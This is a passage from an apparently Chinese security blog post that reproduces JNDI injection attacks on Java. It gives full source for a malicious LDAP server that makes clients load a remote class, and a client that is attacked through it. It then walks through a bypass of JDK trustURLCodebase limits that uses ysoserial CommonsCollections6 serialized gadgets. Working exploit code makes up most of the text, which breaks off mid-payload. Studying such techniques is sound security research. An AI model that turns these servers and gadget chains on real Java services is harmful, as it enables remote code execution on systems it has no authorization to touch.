class="line">        System.out.println(<span class="string">&quot;远程服务启动成功&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里需要注意，在向resourceRef添加StringRefAddr的时候，需要保证</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;hello=eval&quot;</span>));<span class="comment">//等号前面的值和下面的addrType一样</span></span><br><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;hello&quot;</span>,poc));</span><br></pre></td></tr></table></figure>

<p>假设不一样，如果下面的代码是<code>resourceRef.add(new StringRefAddr(&quot;x&quot;,poc));</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215220822913.png" alt="image-20211215220822913"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215220909325.png" alt="image-20211215220909325"></p>
<p>那么在之后获取method的时候，会返回空值。</p>
<p><strong>受攻击方：Test.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            context.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>除了查询了BeanFactory可以被利用，以及EL表达式的相关代码（因为不会）以外，其他均是我自己独立审计的过程，并未照抄代码去跟，希望能锻炼自己的代码审计能力。虽然依然很菜，但是感觉到了有明显的进步。</p>
<p>这一节写的很乱，但也是整个完整审计过程的复现。</p>
<h1 id="JNDI-LDAP注入"><a href="#JNDI-LDAP注入" class="headerlink" title="JNDI+LDAP注入"></a>JNDI+LDAP注入</h1><h2 id="由来-2"><a href="#由来-2" class="headerlink" title="由来"></a>由来</h2><p>为了绕过JNDI+RMI的限制，大佬们又盯上了JNDI+LDAP，LDAP服务也能返回JNDI Reference对象，利用过程与之前的JNDI+RMI基本相同。</p>
<blockquote>
<p><strong>在Oracle JDK 11.0.1、8u191、7u201、6u211之后</strong> com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。</p>
</blockquote>
<h2 id="攻击实现-1"><a href="#攻击实现-1" class="headerlink" title="攻击实现"></a>攻击实现</h2><p><strong>攻击方：自定义LDAP服务端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPInj</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">7777</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), port,</span><br><span class="line">                    ServerSocketFactory.getDefault(), SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()</span><br><span class="line">            ));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8080/#EvilLDAP&quot;</span>)));</span><br><span class="line">            <span class="comment">// 当前环境下如果没有EvilLDAP.class，则会去访问8080端口下的 /EvilLDAP.class</span></span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们使用拦截器，来拦截修改返回entry的<strong>attribute</strong></p>
<p><strong>被攻击方: TEST.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line"><span class="comment">//            //写法一 将codebase的地址写在lookup中</span></span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            context.lookup(<span class="string">&quot;ldap://127.0.0.1:7777/#EvilLDAP&quot;</span>);</span><br><span class="line">            <span class="comment">//写法二 预先设定环境，以hashtable的形式保存在context中</span></span><br><span class="line"><span class="comment">/*            Hashtable&lt;String,String&gt; env= new Hashtable&lt;String, String&gt;();</span></span><br><span class="line"><span class="comment">            env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.ldap.LdapCtxFactory&quot;);</span></span><br><span class="line"><span class="comment">            env.put(Context.PROVIDER_URL, &quot;ldap://localhost:7777&quot;);</span></span><br><span class="line"><span class="comment">            Context context = new InitialContext(env);</span></span><br><span class="line"><span class="comment">            context.lookup(&quot;#EvilLDAP&quot;);*/</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>**InitialContext()**是使用JNDI的接口</p>
<p>方法一直接将完整地址(包括服务类型)都写在lookup中，方法二预先设定相关codebase配置</p>
<h2 id="攻击流程分析"><a href="#攻击流程分析" class="headerlink" title="攻击流程分析"></a>攻击流程分析</h2><p>我们要了解，LDAP在使用<strong>search</strong>功能的时候，实质上，是会返回一系列<strong>entry</strong>,entry中会包含各种<strong>attributes</strong></p>
<p>举个例子，比如我想要查询某些数据，可以通过search的功能来搜索，例如：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214192038752.png" alt="image-20211214192038752"></p>
<p>它返回的不是object，而是<strong>attribute</strong>，因此，正常来说，这个<strong>search</strong> function是不存在RCE漏洞的。</p>
<p>在<strong>Blackhat 2016</strong>中大佬们有提到：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214191715523.png" alt="image-20211214191715523"></p>
<p><strong>LDAP</strong>中有个<strong>SearchConrols.setReturningObjFlag()<strong>，当它为true的时候，表明我们的返回结果中会包含一个instance，同时LDAP返回的entry会根据attribute来重新构建一个</strong>instance</strong>，，这一点我们先记住了。</p>
<p>触发的代码是<strong>lookup()</strong>,我们猜测是不是lookup()里面有instance呢？</p>
<p>调试一下<strong>被攻击方: TEST.java</strong>：</p>
<p>前面一系列的调用就不说了，关键在<strong>LdapCtx.c_lookup()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214192651508.png" alt="image-20211214192651508"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214192820056.png" alt="image-20211214192820056"></p>
<p>看到了熟悉的<strong>SearchControls</strong>、<strong>setReturningObjFlag</strong>和**doSearch()**方法。</p>
<p>继续往下走</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214204848798.png" alt="image-20211214204848798">,我们发现decodeObject()的参数是attributes，</p>
<p>进去看看：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214205501121.png" alt="image-20211214205501121"></p>
<p>继续跟进<strong>decodeReference()<strong>，发现里面就是在获取attributes的值，然后用这些attributes新建一个</strong>reference</strong>，最后返回。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214205834240.png" alt="image-20211214205834240"></p>
<p>然后回到**LdapCtx.c_lookup()<strong>，最后走到了</strong>getObjectInstance()**方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214210111308.png" alt="image-20211214210111308"></p>
<p>往下发现了我们在之前Reference+RMI案例中一样的funciton - <strong>getObjectFactoryFromReference()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214210233645.png" alt="image-20211214210233645"></p>
<p>接下来就是从远程codebase加载class</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214210311439.png" alt="image-20211214210311439"></p>
<p>执行到loadClass,弹出了计算器。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211214210346103.png" alt="image-20211214210346103"></p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>简单总结一下，JNDI+LDAP注入的流程</p>
<ul>
<li>JNDI的lookup()参数可控，攻击者修改参数为恶意的LDAP服务器地址</li>
<li>攻击者构造的LDAP服务器使用拦截器，修改response，在返回的entry中添加attributes - javaClassName, javaCodeBase, objectClass, javaFactory。</li>
<li>修改后的response被返回给客户端，客户端根据attributes重新生成一个reference类型的object，并通过该reference远程加载codebase上的恶意class</li>
</ul>
<p>整个流程到此结束。</p>
<h1 id="JNDI-LDAP绕过高版本JDK限制"><a href="#JNDI-LDAP绕过高版本JDK限制" class="headerlink" title="JNDI+LDAP绕过高版本JDK限制"></a>JNDI+LDAP绕过高版本JDK限制</h1><h2 id="由来-3"><a href="#由来-3" class="headerlink" title="由来"></a>由来</h2><p><strong>在Oracle JDK 11.0.1、8u191、7u201、6u211之后</strong> com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，那么我们能否绕过该检测呢？</p>
<h2 id="首次尝试"><a href="#首次尝试" class="headerlink" title="首次尝试"></a>首次尝试</h2><p>同样是将client的lookup()进行断点，我们跟到<strong>VersionHelper12.loadClass()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211216214228623.png" alt="image-20211216214228623"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equalsIgnoreCase(trustURLCodebase)) &#123;<span class="comment">//此处会检测trustURLCodebase是否为真</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span></span><br><span class="line">                URLClassLoader.newInstance(getUrlArray(codebase), parent);<span class="comment">//加载CLASS</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//不为真则返回空</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里返回空，导致我们无法RCE。</p>
<p>同样的，我们只能考虑加载本地Class</p>
<p>在**NamingManager.getObjectFactoryFromReference()**中，我们可以看到如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">    Reference ref, String factoryName)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">    InstantiationException,</span><br><span class="line">    MalformedURLException &#123;</span><br><span class="line">    Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Try to use current class loader 这里会查找本地path下的class</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         clas = helper.loadClass(factoryName);<span class="comment">//找到后进行加载</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;<span class="comment">//加载后的Class在这里会被新建一个对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们注意到，加载后的class会被转换成<strong>ObjectFactory</strong>类，并新建一个<strong>instance</strong>。</p>
<p>因此我们需要找到一个<strong>implements ObjectFactory</strong>的class。</p>
<p>继续往下执行，返回到了<strong>DirectoryManager.getObjectInstance()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211216220902748.png" alt="image-20211216220902748"></p>
<p>发现这里执行了<strong>factory.getObjectInstance()</strong>,还记得前面的<strong>JNDI+RMI绕过高版本JDK限制</strong>的章节吗，我们用到了BeanFactory来反射执行了<strong>ELProcessor</strong>，那在这里我们是否可以继续这样使用呢？答案是不可以。</p>
<p>在<strong>DirectoryManager.getObjectInstance()<strong>中，将ref转换成了Reference类，而我们的</strong>BeanFactory.getObjectInstance()<strong>中要求obj必须为</strong>ResourceRef</strong>。JNDI在接收到LDAP server传过来的entry后，会根据attribute重新生成Reference类的object，所以导致我们无法满足<strong>BeanFactory</strong>的要求。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211216222112900.png" alt="image-20211216222112900"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211216221823204.png" alt="image-20211216221823204"></p>
<p>所以我们不能利用本地Class中的BeanFactory来进行RCE的触发，还有没有其他办法呢？</p>
<h2 id="再次尝试之反序列化数据"><a href="#再次尝试之反序列化数据" class="headerlink" title="再次尝试之反序列化数据"></a>再次尝试之反序列化数据</h2><p><strong>Alvaro Muñoz 和Oleksandr Miroshhe</strong>在<strong>Black Hat</strong>提到了<strong>Entry Poisoning with Serialized Objects</strong>，正如我们之前所说，JNDI在接收到Entry后会根据其attributes来<strong>reconstruct a reference object</strong>。</p>
<p>有四种类型的java object representation可以被存储在Directory Service中：</p>
<ul>
<li>Serialized Objects(javaSerializedObject)<ul>
<li>JavaClassName, javaClassNames, javaCodebase, javaSerializedData</li>
</ul>
</li>
<li>JNDI References(javaNamingReference)<ul>
<li>JavaClassName, javaClassNames, javaCodebase, javaReferenceAddress, javaFactory</li>
</ul>
</li>
<li>Marshalled Objects(javaMarshalledObject)<ul>
<li>javaClassName, javaClassNames, javaSerializedData</li>
</ul>
</li>
<li>Remote Location(Deprecated)<ul>
<li>javaClassName, javaRemoteLocation</li>
</ul>
</li>
</ul>
<p>很明显，我们让传入的attributes是Serialized Objects的特征，这样我们就可以使用本地的gadgets了。</p>
<p>接下来，我将使用<strong>cc6</strong>的反序列化链来实现：</p>
<p>在windows上不能直接base64编码很麻烦，所以我把ysoserial的jar包拖到kali中生成</p>
<p><code>java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections6 &quot;calc&quot;|base64</code></p>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><strong>恶意Server端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPInj</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">7777</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), port,</span><br><span class="line">                    ServerSocketFactory.getDefault(), SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()</span><br><span class="line">            ));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8080/#EvilLDAP&quot;</span>)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException, ParseException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span 